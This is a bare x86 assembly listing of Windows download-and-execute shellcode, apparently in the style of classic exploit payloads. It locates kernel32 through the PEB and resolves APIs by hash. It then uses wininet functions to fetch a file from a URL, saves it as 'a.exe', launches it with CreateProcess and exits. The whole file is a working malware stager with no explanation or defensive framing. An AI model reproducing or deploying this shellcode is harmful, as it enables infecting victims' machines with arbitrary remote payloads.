section .text
global _start

_start:
    ; Jump to the startup bounce point
    jmp startup_bnc

find_kernel32:
    ; Preserve registers
    push esi
    xor eax, eax
    mov eax, fs:[eax + 0x30]
    test eax, eax
    js find_kernel32_9x
find_kernel32_nt:
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov eax, [eax + 0x8]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov eax, [eax + 0x34]
    lea eax, [eax + 0x7c]
    mov eax, [eax + 0x3c]
find_kernel32_finished:
    pop esi
    ret

find_function:
    ; Preserve all registers
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    xor edi, edi
    xor eax, eax
    cld
compute_hash:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp compute_hash
compute_hash_finished:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret

startup_bnc:
    jmp startup

resolve_symbols_for_dll:
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp, 0x08
    add edi, 0x04
    cmp esi, ecx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret

kernel32_symbol_hashes:
    dd 0xec0e4e8e
    dd 0x7c0017a5
    dd 0xe80a791f
    dd 0x0ffd97fb
    dd 0x16b3fe72
    dd 0x73e2d87e

wininet_symbol_hashes:
    dd 0x57e84429
    dd 0x7e0fed49
    dd 0x5fe34b8b

startup:
    sub esp, 0x60
    mov ebp, esp
    jmp get_absolute_address_forward
get_absolute_address_middle:
    jmp get_absolute_address_end
get_absolute_address_forward:
    call get_absolute_address_middle
get_absolute_address_end:
    pop esi
    call find_kernel32
    mov edx, eax
resolve_kernel32_symbols:
    sub esi, 0x3a
    dec [esi + 0x06]
    lea edi, [ebp + 0x04]
    mov ecx, esi
    add ecx, 0x18
    call resolve_symbols_for_dll
resolve_wininet_symbols:
    add ecx, 0x0c
    mov eax, 0x74656e01
    sar eax, 0x08
    push eax
    push 0x696e6977
    mov ebx, esp
    push ecx
    push edx
    push ebx
    call [ebp + 0x04]
    pop edx
    pop ecx
    mov edx, eax
    call resolve_symbols_for_dll
internet_open:
    xor eax, eax
    push eax
    push eax
    push eax
    push eax
    push eax
    call [ebp + 0x1c]
    mov [ebp + 0x34], eax
internet_open_url:
    xor eax, eax
    push eax
    push eax
    push eax
    push eax
    lea ebx, [ebp + 0x40]
    push ebx
    push [ebp + 0x34]
    call [ebp + 0x20]
    mov [ebp + 0x38], eax
create_file:
    xor eax, eax
    mov al, 0x65
    push eax
    push 0x78652e61
    mov [ebp + 0x30], esp
    xor eax, eax
    push eax
    mov al, 0x82
    push eax
    mov al, 0x02
    push eax
    xor al, al
    push eax
    push eax
    mov al, 0x40
    sal eax, 0x18
    push eax
    push [ebp + 0x30]
    call [ebp + 0x08]
    mov [ebp + 0x3c], eax
download_begin:
    xor eax, eax
    mov ax, 0x010c
    sub esp, eax
    mov esi, esp
download_loop:
    lea ebx, [esi + 0x04]
    push ebx
    mov ax, 0x0104
    push eax
    lea eax, [esi + 0x08]
    push eax
    push [ebp + 0x38]
    call [ebp + 0x24]
    mov eax, [esi + 0x04]
    test eax, eax
    jz download_finished
download_write_file:
    xor eax, eax
    push eax
    lea eax, [esi + 0x04]
    push eax
    push [esi + 0x04]
    lea eax, [esi + 0x08]
    push eax
    push [ebp + 0x3c]
    call [ebp + 0x0c]
    jmp download_loop
download_finished:
    push [ebp + 0x3c]
    call [ebp + 0x10]
    xor eax, eax
    mov ax, 0x010c
    add esp, eax
initialize_process:
    xor ecx, ecx
    mov cl, 0x54
    sub esp, ecx
    mov edi, esp
    zero_structs:
    xor eax, eax
    rep stosb
initialize_structs:
    mov edi, esp
    mov byte ptr [edi], 0x44
execute_process:
    lea esi, [edi + 0x44]
    push esi
    push edi
    push eax
    push eax
    push eax
    push eax
    push eax
    push eax
    push [ebp + 0x30]
    push eax
    call [ebp + 0x14]
exit_process:
    call [ebp + 0x18]